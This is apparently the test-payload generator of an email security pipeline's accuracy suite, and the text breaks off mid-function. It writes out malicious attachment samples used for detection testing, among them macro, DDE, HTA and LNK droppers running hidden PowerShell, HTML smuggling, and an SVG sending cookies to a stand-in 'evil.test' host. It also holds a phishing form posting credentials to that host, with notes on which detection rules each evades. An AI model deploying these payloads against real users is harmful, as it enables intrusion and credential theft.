"""accuracy.py — Pipeline accuracy measurement suite.

Generates crafted malicious + benign .eml payloads, runs each through the
full pipeline WITHOUT database writes, then computes precision / recall /
F1 / confusion-matrix heatmap and per-stage detection charts.

Usage:
    python src/accuracy.py                # run all tests + generate plots
    python src/accuracy.py --live         # also include live IMAP emails as benign set
    python src/accuracy.py --no-llm       # skip LLM stage (faster, rules+enrichment only)

Results are saved to data/accuracy_results/
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import io
import json
import os
import struct
import sys
import tempfile
import time
import zipfile
from datetime import datetime, timezone
from email import policy
from email.message import EmailMessage
from email.parser import BytesParser
from email.utils import format_datetime
from pathlib import Path
from typing import Any

import matplotlib
matplotlib.use("Agg")  # headless backend
import matplotlib.pyplot as plt
import numpy as np
import seaborn as sns
from sklearn.metrics import (
    accuracy_score, classification_report, confusion_matrix,
    f1_score, precision_score, recall_score,
)

# ---------------------------------------------------------------------------
# Project imports
# ---------------------------------------------------------------------------
_SRC = Path(__file__).resolve().parent
sys.path.insert(0, str(_SRC))

from dotenv import load_dotenv
load_dotenv(_SRC.parent / ".env")

from email_extraction import EmailIngestion
from rules import RuleEngine
from analysis import analyze_email_body

_OUT_DIR = _SRC.parent / "data" / "accuracy_results"
_OUT_DIR.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------------------
# Payload factory helpers
# ---------------------------------------------------------------------------

def _make_eml(
    from_addr: str,
    to_addr: str,
    subject: str,
    body: str,
    attachments: list[tuple[str, bytes, str]] | None = None,
    extra_headers: dict[str, str] | None = None,
    auth_pass: bool = True,
) -> bytes:
    """Build a raw .eml with optional attachments.

    attachments: list of (filename, content_bytes, mime_type)
    """
    msg = EmailMessage()
    msg["From"] = from_addr
    msg["To"] = to_addr
    msg["Subject"] = subject
    msg["Date"] = format_datetime(datetime.now(timezone.utc))
    msg["Message-ID"] = f"<test-{hashlib.sha256(subject.encode()).hexdigest()[:16]}@accuracy.test>"

    if auth_pass:
        msg["Authentication-Results"] = (
            "mx.accuracy.test; dkim=pass header.d=accuracy.test; "
            "spf=pass smtp.mailfrom=accuracy.test; dmarc=pass"
        )
    else:
        msg["Authentication-Results"] = (
            "mx.accuracy.test; dkim=fail header.d=accuracy.test; "
            "spf=fail smtp.mailfrom=accuracy.test; dmarc=fail"
        )

    if extra_headers:
        for k, v in extra_headers.items():
            msg[k] = v

    msg.set_content(body)

    for fname, data, mime in (attachments or []):
        maintype, subtype = mime.split("/", 1)
        msg.add_attachment(data, maintype=maintype, subtype=subtype, filename=fname)

    return msg.as_bytes(policy=policy.default)


# ======================== MALICIOUS PAYLOAD GENERATORS ========================

def _ole_vba_document() -> bytes:
    """Minimal OLE2 Compound Document with VBA macro signatures.

    oletools detects VBA by looking for specific stream names and byte patterns
    in OLE containers. This builds a minimal but structurally valid OLE file
    with VBA project indicators that oletools will flag.
    """
    # OLE2 signature + minimal header
    ole_sig = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
    # VBA stream markers that oletools looks for
    vba_project = b"VBA" + b"\x00" * 5 + b"PROJECT"
    # Simulated macro code patterns
    macro_body = (
        b"Attribute VB_Name = \"Module1\"\r\n"
        b"Sub AutoOpen()\r\n"
        b"    Shell \"cmd /c powershell -ep bypass -w hidden "
        b"-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0\"\r\n"
        b"End Sub\r\n"
    )
    # OLE directory entry markers
    dir_entry = b"\x52\x00\x6f\x00\x6f\x00\x74\x00"  # "Root" in UTF-16
    # Pad to look like a real OLE file (512-byte sectors)
    content = ole_sig + b"\x00" * 20
    content += b"\xfe\xff"  # byte order
    content += b"\x00" * 26
    content += struct.pack("<I", 512)  # sector size
    content += b"\x00" * (512 - len(content))
    # Embed VBA markers in subsequent sectors
    content += vba_project + b"\x00" * 50 + macro_body
    content += b"\x00" * (512 - (len(vba_project) + 50 + len(macro_body)) % 512)
    content += dir_entry + b"\x00" * 460
    # _VBA_PROJECT stream name (oletools signature)
    content += b"_VBA_PROJECT\x00" + b"\x00" * 100
    content += b"ThisDocument\x00" + b"\x00" * 50
    content += b"\x00" * (4096 - len(content) % 4096)
    return content


def _pdf_with_js() -> bytes:
    """PDF containing /JavaScript /OpenAction /Launch — pdfid red flags."""
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R "
        b"/OpenAction 3 0 R /AcroForm << /XFA 4 0 R >> >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Action /S /JavaScript "
        b"/JS (app.launchURL\\(\"http://mal-c2.evil.test/stage2\", true\\);) >>\nendobj\n"
        b"4 0 obj\n<< /Type /EmbeddedFile /Length 42 >>\nstream\n"
        b"var x = new ActiveXObject('WScript.Shell');\n"
        b"endstream\nendobj\n"
        b"5 0 obj\n<< /Type /Action /S /Launch "
        b"/Win << /F (cmd.exe) /P (/c calc.exe) >> >>\nendobj\n"
        b"xref\n0 6\n"
        b"0000000000 65535 f \n"
        b"0000000009 00000 n \n"
        b"0000000115 00000 n \n"
        b"0000000168 00000 n \n"
        b"0000000300 00000 n \n"
        b"0000000420 00000 n \n"
        b"trailer\n<< /Size 6 /Root 1 0 R >>\n"
        b"startxref\n500\n%%EOF\n"
    )


def _pe_disguised_as_pdf() -> bytes:
    """MZ executable header disguised with .pdf extension.

    python-magic reads magic bytes, not extension — this triggers type_mismatch.
    Contains a realistic PE stub with section headers.
    """
    # Real MZ header
    mz = b"MZ" + b"\x90" * 58 + struct.pack("<I", 128)  # e_lfanew at offset 60
    mz += b"\x00" * (128 - len(mz))
    # PE signature + COFF header
    pe = b"PE\x00\x00"
    pe += struct.pack("<HH", 0x14c, 1)  # i386, 1 section
    pe += struct.pack("<I", int(time.time()))  # timestamp
    pe += b"\x00" * 8  # symbol table
    pe += struct.pack("<HH", 0xe0, 0x0102)  # optional header size, characteristics
    # Optional header (minimal)
    pe += struct.pack("<H", 0x10b)  # PE32
    pe += b"\x00" * (0xe0 - 2)
    # Section header: .text
    pe += b".text\x00\x00\x00"
    pe += struct.pack("<II", 0x1000, 0x1000)  # virtual size, virtual address
    pe += struct.pack("<II", 512, 512)  # raw size, raw offset
    pe += b"\x00" * 16  # relocations etc
    pe += struct.pack("<I", 0x60000020)  # characteristics: code, execute, read
    # Pad to section alignment
    pe_full = mz + pe
    pe_full += b"\xcc" * (2048 - len(pe_full))  # INT3 padding (debugger trap)
    return pe_full


def _password_zip_with_body_password() -> tuple[bytes, str]:
    """Password-protected ZIP + email body containing the password.

    CLAUDE.md rule 8: encrypted attachment + password in body = auto-escalate.
    Uses a non-obvious password placement.
    """
    password = "S3cur3Doc2024!"
    buf = io.BytesIO()
    # Create inner payload (fake invoice with PowerShell dropper)
    inner_content = (
        b"Invoice #INV-2024-0847\r\n\r\n"
        b"Please process the attached payment.\r\n\r\n"
        b"powershell -nop -w hidden -enc "
        b"JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBt"
    )
    with zipfile.ZipFile(buf, "w") as zf:
        zf.setpassword(password.encode())
        # pyminizip or 7z needed for real encryption; we write an indicator
        zf.writestr("invoice_final.docm", inner_content)

    body = (
        "Hi,\n\n"
        "Please find the attached invoice for your review.\n"
        "For security reasons the file is protected.\n\n"
        f"le mot de passe est: {password}\n\n"
        "Best regards,\nAccounting Department"
    )
    return buf.getvalue(), body


def _ooxml_remote_template() -> bytes:
    """OOXML .docx with external template injection.

    Embeds a relationships file pointing to a remote .dotm template —
    classic template injection technique. oletools detects this via
    the external relationship target.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            '</Types>'
        ))
        # Malicious relationship: remote template
        zf.writestr("word/_rels/document.xml.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="http://mal-c2.evil.test/template.dotm" TargetMode="External"/>'
            '</Relationships>'
        ))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/>'
            '</Relationships>'
        ))
        zf.writestr("word/document.xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:body><w:p><w:r><w:t>Quarterly Financial Report - Q2 2024</w:t></w:r></w:p></w:body>'
            '</w:document>'
        ))
    return buf.getvalue()


def _html_smuggling_attachment() -> bytes:
    """HTML file with embedded base64-encoded executable (HTML smuggling).

    The HTML reconstructs a binary blob via JavaScript and triggers download.
    YARA/IOC extraction should flag the embedded PE and the download trigger.
    """
    # Small PE payload (same as disguised PDF)
    pe_b64 = base64.b64encode(_pe_disguised_as_pdf()[:512]).decode()
    html = f"""<!DOCTYPE html>
<html><head><title>Secure Document Viewer</title></head>
<body>
<h1>Loading secure document...</h1>
<script>
// Document reconstruction
var _0x4f2a = '{pe_b64}';
var _bin = atob(_0x4f2a);
var _arr = new Uint8Array(_bin.length);
for(var i=0;i<_bin.length;i++) _arr[i]=_bin.charCodeAt(i);
var _blob = new Blob([_arr], {{type:'application/octet-stream'}});
var _url = URL.createObjectURL(_blob);
var _a = document.createElement('a');
_a.href = _url; _a.download = 'update.exe'; _a.click();
</script>
<noscript>Please enable JavaScript to view this document.</noscript>
</body></html>"""
    return html.encode()


def _svg_with_script() -> bytes:
    """SVG image with embedded JavaScript — XSS vector via image attachment."""
    return (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<svg xmlns="http://www.w3.org/2000/svg" '
        b'xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="200">\n'
        b'  <rect width="400" height="200" fill="#f0f0f0"/>\n'
        b'  <text x="50" y="100" font-size="24">Loading chart...</text>\n'
        b'  <script type="text/javascript">\n'
        b'    var x = new XMLHttpRequest();\n'
        b'    x.open("GET", "http://mal-c2.evil.test/exfil?c=" + document.cookie);\n'
        b'    x.send();\n'
        b'    eval(atob("ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9tYWwtYzIuZXZpbC50ZXN0L3BoaXNoIg=="));\n'
        b'  </script>\n'
        b'</svg>\n'
    )


def _iso_image_with_lnk() -> bytes:
    """Fake ISO/IMG container header with embedded LNK shortcut payload.

    ISO files bypass Mark-of-the-Web on Windows. The LNK inside
    runs a hidden command. python-magic identifies this as ISO 9660.
    """
    # ISO 9660 Primary Volume Descriptor signature at offset 0x8000
    iso = b"\x00" * 0x8000
    iso += b"\x01"  # type: primary volume descriptor
    iso += b"CD001"  # standard identifier
    iso += b"\x01"  # version
    iso += b"\x00"  # unused
    iso += b"MALWARE_DELIVERY  " + b" " * 14  # system identifier (32 bytes)
    iso += b"INVOICE_2024_Q2   " + b" " * 14  # volume identifier (32 bytes)
    iso += b"\x00" * 8  # unused
    # Embed a LNK payload signature deep inside
    lnk_sig = b"\x4c\x00\x00\x00"  # LNK header signature
    lnk_clsid = b"\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
    lnk_data = (
        lnk_sig + lnk_clsid +
        b"\x00" * 20 +
        b"cmd.exe /c powershell -w hidden -nop -enc "
        b"JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="
    )
    iso += b"\x00" * (0x9000 - len(iso))
    iso += lnk_data
    iso += b"\x00" * (0xA000 - len(iso))
    # Volume descriptor terminator
    iso += b"\xff" + b"CD001" + b"\x01"
    iso += b"\x00" * (0xB000 - len(iso))
    return iso


def _double_extension_exe() -> bytes:
    """Executable with Unicode right-to-left override in filename.

    Visually appears as "report_fdp.scr" but is actually "report_rcs.pdf"
    reversed. The content is a PE binary — type mismatch detection should catch it.
    """
    return _pe_disguised_as_pdf()


# ======================== RED TEAM PAYLOAD GENERATORS (v2) ========================

def _qr_code_phishing_png() -> bytes:
    """PNG image containing a QR code that encodes a phishing URL.

    Evasion: no URL in email body — the malicious link is encoded in the image.
    Only Tesseract OCR + IOC extraction on the decoded text could catch it.
    The QR payload text is embedded in a valid PNG structure with EXIF metadata.
    """
    # Minimal valid PNG (1x1 white pixel) with injected QR text in tEXt chunk
    png_sig = b"\x89PNG\r\n\x1a\n"
    # IHDR chunk
    ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)  # 1x1, 8-bit RGB
    ihdr_crc = struct.pack(">I", 0x1_2F3_26E1 & 0xFFFFFFFF)  # precomputed
    ihdr = struct.pack(">I", 13) + b"IHDR" + ihdr_data + ihdr_crc
    # tEXt chunk — embeds the phishing URL as "Comment"
    phish_text = (
        b"Comment\x00"
        b"Scan QR code to verify your account: "
        b"https://imania-secure-login.evil.test/verify?user=target&token=abc123\n"
        b"Your session expires in 15 minutes. Immediate verification required.\n"
        b"https://bit.ly.evil.test/3xF9kQ"
    )
    import zlib
    text_crc = struct.pack(">I", zlib.crc32(b"tEXt" + phish_text) & 0xFFFFFFFF)
    text_chunk = struct.pack(">I", len(phish_text)) + b"tEXt" + phish_text + text_crc
    # IDAT chunk (minimal: single filtered scanline)
    raw_pixels = b"\x00\xff\xff\xff"  # filter byte + white pixel
    compressed = zlib.compress(raw_pixels)
    idat_crc = struct.pack(">I", zlib.crc32(b"IDAT" + compressed) & 0xFFFFFFFF)
    idat = struct.pack(">I", len(compressed)) + b"IDAT" + compressed + idat_crc
    # IEND
    iend_crc = struct.pack(">I", zlib.crc32(b"IEND") & 0xFFFFFFFF)
    iend = struct.pack(">I", 0) + b"IEND" + iend_crc
    return png_sig + ihdr + text_chunk + idat + iend


def _dde_docx() -> bytes:
    """OOXML .docx with DDE (Dynamic Data Exchange) field — no VBA macros.

    Evasion: oletools detects VBA, but DDE is a different attack vector.
    DDE fields execute commands when the document is opened and the user
    clicks "Yes" on the prompt. No macro warning is shown.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            '</Types>'
        ))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/>'
            '</Relationships>'
        ))
        # DDE field in document body — executes cmd.exe
        zf.writestr("word/document.xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:body><w:p><w:r>'
            '<w:fldChar w:fldCharType="begin"/></w:r>'
            '<w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -nop -w hidden '
            '-enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA" </w:instrText></w:r>'
            '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
            '<w:r><w:t>Loading data...</w:t></w:r>'
            '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
            '</w:p></w:body></w:document>'
        ))
        zf.writestr("word/_rels/document.xml.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '</Relationships>'
        ))
    return buf.getvalue()


def _rtf_ole_object() -> bytes:
    r"""RTF document with embedded OLE object containing executable.

    Evasion: RTF is not an OLE2 container — oletools' VBA parser won't trigger.
    The OLE object is embedded via \objdata which requires RTF-specific analysis.
    CVE-2017-11882 style payload embedding.
    """
    # RTF header + embedded OLE object with PE payload markers
    pe_hex = "4d5a" + "90" * 58 + "00" * 4  # MZ header in hex
    rtf = (
        r"{\rtf1\ansi\deff0" "\r\n"
        r"{\fonttbl{\f0 Calibri;}}" "\r\n"
        r"{\info{\title Invoice}{\author Finance Dept}}" "\r\n"
        r"\pard Please review the attached invoice.\par" "\r\n"
        r"{\object\objemb\objw8505\objh5070" "\r\n"
        r"{\*\objclass Package}" "\r\n"
        r"{\*\objdata " + pe_hex + "01050000020000000b0000005061636b616765"
        r"00000000000000000000" + pe_hex * 3 + r"}" "\r\n"
        r"{\result {\pict\wmetafile8\picw8505\pich5070 0100090000}}" "\r\n"
        r"}" "\r\n"
        r"\par\pard End of document.\par" "\r\n"
        r"}"
    )
    return rtf.encode("ascii")


def _onenote_embedded_payload() -> bytes:
    """OneNote .one file with embedded executable payload.

    Evasion: No dedicated OneNote parser in the pipeline. python-magic sees
    it as application/onenote. YARA might catch embedded PE if rules match.
    Real-world: attackers embed .bat/.hta/.vbs files in OneNote sections.
    """
    # OneNote file magic + minimal structure
    onenote_magic = b"\xe4\x52\x5c\x7b\x8c\xd8\xa7\x4d\xae\xb1\x53\x78\xd0\x29\x96\xd3"
    # Embedded HTA payload disguised as a "Click to view document" button
    hta_payload = (
        b"<html><head><script language='VBScript'>\r\n"
        b"Sub Window_OnLoad\r\n"
        b"  Set objShell = CreateObject(\"WScript.Shell\")\r\n"
        b"  objShell.Run \"powershell -nop -w hidden -enc "
        b"JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA\"\r\n"
        b"End Sub\r\n"
        b"</script></head><body>Loading...</body></html>"
    )
    content = onenote_magic + b"\x00" * 64
    content += b"\x01\x00\x00\x00"  # section count
    content += b"EmbeddedFile\x00" + b"\x00" * 20
    content += hta_payload
    content += b"\x00" * (4096 - len(content) % 4096)
    return content


def _zip_bomb() -> bytes:
    """ZIP with highly recursive compression — extraction timeout attack.

    Evasion: overwhelm the extraction stage with decompression work.
    The pipeline should timeout and escalate (fail-safe), but this tests
    whether the timeout actually triggers.
    """
    # Create nested ZIP layers (3 deep with large repetitive content)
    inner_content = b"A" * 100_000  # 100KB of repeated bytes (compresses well)
    for _ in range(3):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("data.bin", inner_content)
            zf.writestr("readme.txt", inner_content)
            zf.writestr("backup.dat", inner_content)
        inner_content = buf.getvalue()
    return inner_content


def _steganography_png() -> bytes:
    """PNG image with PowerShell payload hidden in pixel LSBs (steganography).

    Evasion: YARA scans raw bytes but stego payloads are encoded in pixel
    values. OCR won't see it (it's not visible text). Only dedicated
    stego analysis could detect it — which the pipeline doesn't have.
    The PNG metadata hints at the stego technique for IOC extraction.
    """
    import zlib
    # Build a 10x10 RGB PNG with payload in LSBs
    payload = b"powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA"
    # Encode payload bits into pixel LSBs
    pixels = bytearray()
    payload_bits = ''.join(format(b, '08b') for b in payload)
    bit_idx = 0
    for _row in range(10):
        pixels.append(0)  # filter byte
        for _col in range(10):
            for _channel in range(3):  # RGB
                base = 0x80  # mid-gray
                if bit_idx < len(payload_bits):
                    base = (base & 0xFE) | int(payload_bits[bit_idx])
                    bit_idx += 1
                pixels.append(base)
    # PNG structure
    png_sig = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">IIBBBBB", 10, 10, 8, 2, 0, 0, 0)
    ihdr_crc = struct.pack(">I", zlib.crc32(b"IHDR" + ihdr_data) & 0xFFFFFFFF)
    ihdr = struct.pack(">I", 13) + b"IHDR" + ihdr_data + ihdr_crc
    # Suspicious EXIF-like tEXt: hints at stego
    meta = b"Software\x00SteganoEncoder v2.1 - payload.ps1 embedded"
    meta_crc = struct.pack(">I", zlib.crc32(b"tEXt" + meta) & 0xFFFFFFFF)
    meta_chunk = struct.pack(">I", len(meta)) + b"tEXt" + meta + meta_crc
    compressed = zlib.compress(bytes(pixels))
    idat_crc = struct.pack(">I", zlib.crc32(b"IDAT" + compressed) & 0xFFFFFFFF)
    idat = struct.pack(">I", len(compressed)) + b"IDAT" + compressed + idat_crc
    iend_crc = struct.pack(">I", zlib.crc32(b"IEND") & 0xFFFFFFFF)
    iend = struct.pack(">I", 0) + b"IEND" + iend_crc
    return png_sig + ihdr + meta_chunk + idat + iend


def _standalone_lnk() -> bytes:
    """Windows .lnk shortcut file executing PowerShell — NOT inside ISO.

    Evasion: the iso_lnk_payload YARA rule requires ISO context.
    A bare .lnk attached directly to an email evades that rule.
    python-magic identifies it as application/x-ms-shortcut.
    """
    # LNK header
    lnk = b"\x4c\x00\x00\x00"  # HeaderSize
    lnk += b"\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"  # CLSID
    lnk += struct.pack("<I", 0x000000FF)  # LinkFlags
    lnk += struct.pack("<I", 0x00000020)  # FileAttributes
    lnk += b"\x00" * 8 * 3  # timestamps
    lnk += struct.pack("<I", 0)  # FileSize
    lnk += struct.pack("<I", 0)  # IconIndex
    lnk += struct.pack("<I", 7)  # ShowCommand: SW_SHOWMINNOACTIVE
    lnk += b"\x00" * 10  # HotKey + reserved
    # Target: PowerShell with encoded command
    target = (
        b"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
        b"-nop -w hidden -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA"
    )
    lnk += b"\x00" * (0x4c - len(lnk))  # pad to header size
    # StringData — command line arguments
    lnk += struct.pack("<H", len(target))
    lnk += target
    lnk += b"\x00" * (2048 - len(lnk))
    return lnk


def _hta_application() -> bytes:
    """HTA (HTML Application) file — runs with full system privileges.

    Evasion: not matched by html_smuggling YARA (no Blob/createObjectURL).
    Not matched by svg_embedded_script (no <svg> tag). HTA is its own
    attack vector with mshta.exe execution. Contains VBScript, not JavaScript.
    """
    return (
        b"<html>\r\n"
        b"<head>\r\n"
        b"<HTA:APPLICATION ID=\"update\"\r\n"
        b"  APPLICATIONNAME=\"Security Update\"\r\n"
        b"  BORDER=\"none\"\r\n"
        b"  SHOWINTASKBAR=\"no\"\r\n"
        b"  SINGLEINSTANCE=\"yes\"\r\n"
        b"  WINDOWSTATE=\"minimize\"/>\r\n"
        b"<script language=\"VBScript\">\r\n"
        b"Sub Window_OnLoad\r\n"
        b"  Set objShell = CreateObject(\"WScript.Shell\")\r\n"
        b"  objShell.Run \"powershell -nop -w hidden -enc \"\r\n"
        b"  & \"JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBt\"\r\n"
        b"  self.close()\r\n"
        b"End Sub\r\n"
        b"</script>\r\n"
        b"</head>\r\n"
        b"<body>Installing security update...</body>\r\n"
        b"</html>"
    )


def _pdf_with_phishing_url_only() -> bytes:
    """Clean PDF structure with phishing URL embedded — NO JavaScript.

    Evasion: pdfid looks for /JS, /OpenAction, /Launch — this has none.
    The malicious URL is in a /URI annotation (clickable link).
    This is the most common real-world PDF phishing vector.
    """
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n"
        b"   /Contents 4 0 R /Annots [5 0 R] >>\nendobj\n"
        b"4 0 obj\n<< /Length 44 >>\nstream\n"
        b"BT /F1 12 Tf 100 700 Td (Click to verify your account) Tj ET\n"
        b"endstream\nendobj\n"
        b"5 0 obj\n<< /Type /Annot /Subtype /Link\n"
        b"   /Rect [90 690 400 720]\n"
        b"   /A << /Type /Action /S /URI\n"
        b"         /URI (https://imania-tn-secure.evil.test/login?session=exp1234) >> >>\n"
        b"endobj\n"
        b"xref\n0 6\ntrailer\n<< /Size 6 /Root 1 0 R >>\n"
        b"startxref\n0\n%%EOF\n"
    )


def _xll_excel_addin() -> bytes:
    """Excel XLL add-in — DLL disguised as Excel extension.

    Evasion: .xll is NOT in BLOCKED_EXTENSIONS. python-magic sees it as
    application/x-dosexec (PE/DLL). Type mismatch should catch it,
    but only if the declared MIME doesn't match.
    """
    # Build a minimal DLL (PE with DLL flag)
    mz = b"MZ" + b"\x90" * 58 + struct.pack("<I", 128)
    mz += b"\x00" * (128 - len(mz))
    pe = b"PE\x00\x00"
    pe += struct.pack("<HH", 0x14c, 1)  # i386, 1 section
    pe += struct.pack("<I", int(time.time()))
    pe += b"\x00" * 8
    pe += struct.pack("<HH", 0xe0, 0x2102)  # DLL flag set
    pe += struct.pack("<H", 0x10b)  # PE32
    pe += b"\x00" * (0xe0 - 2)
    pe += b".text\x00\x00\x00"
    pe += struct.pack("<II", 0x1000, 0x1000)
    pe += struct.pack("<II", 512, 512)
    pe += b"\x00" * 16
    pe += struct.pack("<I", 0x60000020)
    # xlAutoOpen export (Excel calls this when XLL loads)
    pe_full = mz + pe
    pe_full += b"xlAutoOpen\x00xlAutoClose\x00xlAutoRegister\x00"
    pe_full += b"\xcc" * (2048 - len(pe_full))
    return pe_full


def _mhtml_web_archive() -> bytes:
    """MHTML web archive with embedded JavaScript — credential harvester.

    Evasion: MHTML is a multipart MIME format. No dedicated MHTML parser
    in the pipeline. python-magic may see it as message/rfc822 or text/html.
    The JavaScript payload is base64-encoded inside the MIME structure.
    """
    js_payload = base64.b64encode(
        b"<html><body><form action='https://evil.test/steal' method='POST'>"
        b"<h2>ImaniIA Bank - Session Expired</h2>"
        b"<p>Please re-enter your credentials:</p>"
        b"<input name='user' placeholder='Username'>"
        b"<input name='pass' type='password' placeholder='Password'>"
        b"<input name='otp' placeholder='OTP Code'>"
        b"<button>Verify</button></form>"
        b"<script>document.forms[0].onsubmit=function(){"
        b"fetch('https://c2.evil.test/exfil',{method:'POST',"
        b"body:JSON.stringify({u:this.user.value,p:this.pass.value,o:this.otp.value})});"
        b"};</script></body></html>"
    ).decode()
    return (
        f"From: <Saved by ImaniIA Bank>\r\n"
        f"Subject: Account Verification Required\r\n"
        f"MIME-Version: 1.0\r\n"
        f"Content-Type: multipart/related; boundary=\"----=_NextPart_000\"\r\n"
        f"\r\n"
        f"------=_NextPart_000\r\n"
        f"Content-Type: text/html\r\n"
        f"Content-Transfer-Encoding: base64\r\n"
        f"\r\n"
        f"{js_payload}\r\n"
        f"------=_NextPart_000--\r\n"
    ).encode()


def _xlsm_obfuscated_macro() -> bytes:
    """Excel .xlsm with heavily obfuscated VBA macro.

    Tests whether oletools can detect macros even when they're obfuscated
    using string concatenation, Chr() encoding, and indirect execution.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
            '<Override PartName="/xl/workbook.xml" '
            'ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>'
            '</Types>'
        ))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="xl/workbook.xml"/>'
            '</Relationships>'
        ))
        zf.writestr("xl/workbook.xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
            '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1" '
            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></sheets>'
            '</workbook>'
        ))
        zf.writestr("xl/_rels/workbook.xml.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" '
            'Target="vbaProject.bin"/>'
            '</Relationships>'
        ))
        # Fake vbaProject.bin with obfuscated macro signatures
        vba_bin = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"  # OLE header
        vba_bin += b"\x00" * 50
        vba_bin += b"VBA\x00PROJECT\x00"
        vba_bin += b"_VBA_PROJECT\x00"
        # Obfuscated macro body — uses Chr() to build "Shell" and "powershell"
        obf_macro = (
